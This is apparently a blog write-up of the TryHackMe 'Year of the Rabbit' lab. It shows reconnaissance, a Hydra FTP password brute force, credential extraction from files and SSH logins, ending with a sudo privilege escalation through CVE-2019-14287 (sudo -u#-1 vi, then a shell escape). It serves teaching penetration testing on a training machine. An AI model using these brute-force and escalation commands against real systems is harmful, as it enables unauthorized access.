---
title: "Year of the Rabbit - TryHackMe (Easy)"
description: "Analysis of attack on TryHackMe machine: reconnaissance, searching for hidden resources, extracting credentials, password cracking, obtaining SSH access, and privilege escalation to root"
image: "/images/neighbour_thm/thm_main.png"
date: "2026-03-20"
platform: "thm"
---

The **Year of the Rabbit** machine is an example of multi-level pentesting, where each step logically follows from the previous one. The goal is to obtain two flags: user flag and root flag.

![01_intro](/handson/images/the_year_of_rabbit_thm/01_intro.png)

---

## Phase 1. Reconnaissance

### Step 1. Launching Machine and Getting IP Address

![02_ip](/handson/images/the_year_of_rabbit_thm/02_ip.png)

After starting the target machine, we're given the IP address - `10.114.159.85`.

---

### Step 2. Port Scanning (Nmap)

![03_nmap](/handson/images/the_year_of_rabbit_thm/03_nmap.png)


We begin with the mandatory step - scanning open ports:

```bash
sudo nmap -sC -sV 10.114.159.85
```

Nmap discovers three open ports:

| Port | Protocol | Version |
|------|----------|--------|
| 21   | FTP      | vsftpd 3.0.2 |
| 22   | SSH      | OpenSSH 6.7p1 |
| 80   | HTTP     | Apache 2.4.10 (Debian) |

Standard set for a Linux server. We'll access them one by one.

---

## Phase 2. Web Reconnaissance

### Step 3. Web Server Main Page

![04_web](/handson/images/the_year_of_rabbit_thm/04_web.png)


We open `http://10.114.159.85` - before us is the default Apache2 page for Debian. Nothing interesting, but this means we need to look for hidden directories.

---

### Step 4. Directory Brute Force (Gobuster)

![05_gobuster](/handson/images/the_year_of_rabbit_thm/05_gobuster.png)

We launch Gobuster with a basic wordlist:

```bash
gobuster dir -u http://10.114.159.85 -w /usr/share/dirb/wordlists/common.txt
```

From the results, one entry stands out - **`/assets`** (301 Redirect). The rest return 403. We go there.

---

### Step 5. Investigating /assets Directory

![06_assets](/handson/images/the_year_of_rabbit_thm/06_assets.png)


At `http://10.114.159.85/assets/` we find two files:
- `RickRolled.mp4` - a 384 MB video
- `style.css` - a stylesheet

Downloading a gigantic video makes no sense. We open the CSS.

---

### Step 6. Secret in CSS File Comment

![07_style](/handson/images/the_year_of_rabbit_thm/07_style.png)


In the `style.css` file, among regular styles, a commented line is discovered.

Great find - a hidden PHP file. We navigate to the address.

---

### Step 7. JavaScript Protection and Rickroll

![08_javascript](/handson/images/the_year_of_rabbit_thm/08_javascript.png)

![09_youtube](/handson/images/the_year_of_rabbit_thm/09_youtube.png)


When trying to open `/sup3r_s3cr3t_fl4g.php` in the browser, a JavaScript alert appears with text: *"Turn off your javascript..."*, and then a redirect straight to YouTube occurs. The page is protected by a JavaScript redirect.

---

### Step 8. Bypassing Through curl

![10_intermediary](/handson/images/the_year_of_rabbit_thm/10_intermediary.png)


We use `curl` to get "raw" HTTP headers without JavaScript execution:

```bash
curl -I http://10.114.159.85/sup3r_s3cr3t_fl4g.php
```

The server returns **302 Found** with the header:

```
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

The hidden directory is - **`/WExYY2Cv-qU`**.

---

### Step 9. Hidden Directory and Image

![11_directory](/handson/images/the_year_of_rabbit_thm/11_directory.png)

![12_download_image](/handson/images/the_year_of_rabbit_thm/12_download_image.png)


We navigate to `http://10.114.159.85/WExYY2Cv-qU/` - inside is one file: `Hot_Babe.png`. We download it:

```bash
wget http://10.114.159.85/WExYY2Cv-qU/Hot_Babe.png
```

---

## Phase 3. Steganography

### Step 10. Extracting Data from Image (strings)

![13_strings](/handson/images/the_year_of_rabbit_thm/13_strings.png)


We run the `strings` utility directly on the downloaded PNG file:

```bash
strings Hot_Babe.png
```

![14_ftpuser](/handson/images/the_year_of_rabbit_thm/14_ftpuser.png)

In the stream of text strings from the image, we find a hidden message with the FTP username and a long list of potential passwords:

![15_nano_pass](/handson/images/the_year_of_rabbit_thm/15_nano_pass.png)

![16_all_passes](/handson/images/the_year_of_rabbit_thm/16_all_passes.png)

We save the entire password list to a file `pass`.

---

## Phase 4. FTP Brute Force

### Step 11. Password Cracking Through Hydra

![17_ftp_pass](/handson/images/the_year_of_rabbit_thm/17_ftp_pass.png)

Now we have a login (`ftpuser`) and a password dictionary. We launch Hydra:

```bash
hydra -l ftpuser -P pass ftp://10.114.159.85
```

Hydra quickly finds a working password: **`5iezlwGXkfPKQ`**.

---

### Step 12. Connecting to FTP and Downloading File

![18_success_ftp](/handson/images/the_year_of_rabbit_thm/18_success_ftp.png)

We connect to the FTP server with the found credentials:

```bash
ftp 10.114.159.85
```

![19_download_file](/handson/images/the_year_of_rabbit_thm/19_download_file.png)

After logging in, we see the file `Eli's_Creds.txt`. We download it with the `get` command.

---

## Phase 5. Brainfuck and First SSH

### Step 13. Decrypting Eli's_Creds.txt File

![20_cat](/handson/images/the_year_of_rabbit_thm/20_cat.png)


We open the downloaded file and see something strange.

![21_copy_sh](/handson/images/the_year_of_rabbit_thm/21_copy_sh.png)


This is code in the **Brainfuck** language. One of the most exotic obfuscation languages. We paste it into the online interpreter [copy.sh/brainfuck](https://copy.sh/brainfuck/) and get plain text - username and password for SSH.

---

### Step 14. Logging in via SSH as User eli

![22_ssh](/handson/images/the_year_of_rabbit_thm/22_ssh.png)

![23_ls](/handson/images/the_year_of_rabbit_thm/23_ls.png)


```bash
ssh eli@10.114.159.85
```

After entering the password - successful login. Upon authorization, an interesting message from Root to user Gwendoline is immediately displayed:

![24_secret](/handson/images/the_year_of_rabbit_thm/24_secret.png)

> *"I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"*

The hint is obvious - we search for the secret directory.

---

## Phase 6. Lateral Movement

### Step 15. Searching for Secret Place

![25_usr](/handson/images/the_year_of_rabbit_thm/25_usr.png)

We search for everything related to "s3cr3t":

```bash
find / -name "*s3cr3t*" 2>/dev/null
```

![26_pass](/handson/images/the_year_of_rabbit_thm/26_pass.png)

We find the directory **`/usr/games/s3cr3t`**. We navigate there and read the hidden file inside.

Root himself leaked the password - **`MniVCQVhQHUNI`**.

---

### Step 16. SSH as User gwendoline

![27_gwedoline_ssh](/handson/images/the_year_of_rabbit_thm/27_gwedoline_ssh.png)

```bash
ssh gwendoline@10.114.159.85
```

Login successful.

---

### Step 17. Obtaining User Flag

![28_thm_flag_user](/handson/images/the_year_of_rabbit_thm/28_thm_flag_user.png)

In user `gwendoline`'s home directory lies `user.txt`:

```bash
cat user.txt
```

We obtain the user flag.

---

## Phase 7. Privilege Escalation

### Step 18. Analyzing sudo Rights

![29_sudo-l](/handson/images/the_year_of_rabbit_thm/29_sudo-l.png)

We check what gwendoline can run on behalf of other users:

```bash
sudo -l
```

Result:

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Interesting permission: you can run `vi` on behalf of **any user except root**. But this is bypassed through CVE-2019-14287 vulnerability in sudo - when sudo version is below 1.8.28, you can use UID `-1` (or `4294967295`), which sudo interprets as root.

---

### Step 19. Exploiting sudo + vi to Get Root

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

![30_sh](/handson/images/the_year_of_rabbit_thm/30_sh.png)


Inside the vi editor, we execute the command to launch a shell:

``` :!/bin/sh ``` or ``` :!sh ```

We get a shell with **root** privileges.

---

### Step 20. Obtaining Root Flag

![31_flag](/handson/images/the_year_of_rabbit_thm/31_flag.png)


```bash
cat /root/root.txt
```
---

![32_answer](/handson/images/the_year_of_rabbit_thm/32_answer.png)


## Summary

The machine went through the following chain:

1. **Nmap** - discovering ports 21, 22, 80
2. **Gobuster** → `/assets` → `style.css` → hidden PHP file
3. **curl** - bypassing JavaScript redirect, finding hidden directory
4. **strings** on PNG - extracting FTP username and password list
5. **Hydra** - FTP brute force, obtaining password
6. **FTP** - downloading `Eli's_Creds.txt` with Brainfuck code
7. **Brainfuck decoder** - obtaining SSH credentials for `eli`
8. **find** - discovering `/usr/games/s3cr3t` with password for `gwendoline`
9. **User flag** obtained from home directory
10. **CVE-2019-14287** (sudo + vi) - escalation to root
11. **Root flag** obtained from `/root/root.txt`
